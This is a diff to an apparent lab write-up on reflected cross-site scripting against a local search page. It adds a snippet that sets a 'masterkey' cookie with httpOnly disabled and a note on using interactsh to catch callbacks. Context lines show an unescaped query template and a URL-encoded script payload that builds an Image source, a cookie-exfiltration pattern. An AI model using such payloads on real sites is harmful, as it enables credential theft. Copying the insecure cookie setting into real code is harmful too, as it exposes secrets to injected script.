@@ -252,6 +252,15 @@ let html = `<h2>Search Results for "${query}"</h2>`;
 
 ---
 
+## httponly is false
+
+```javascript
+ res.cookie('masterkey', masterKeyValue, {
+            httpOnly: false, // Accessible by javascript code
+        });
+```
+
+
 <img width="1847" height="707" alt="image" src="https://github.com/user-attachments/assets/f8970475-718a-4757-be18-ef4c04be9e39" />
 
 
@@ -266,7 +275,9 @@ http://localhost/search?query=%3Cscript%3Evar%20i%3Dnew%20Image%28%29%3Bi.src%3D
 
 
 
+## or you can user **`interactsh`**
 
+<img width="1915" height="797" alt="image" src="https://github.com/user-attachments/assets/b01b60ab-1a67-4032-adb0-93a3395917a8" />
 
 
 
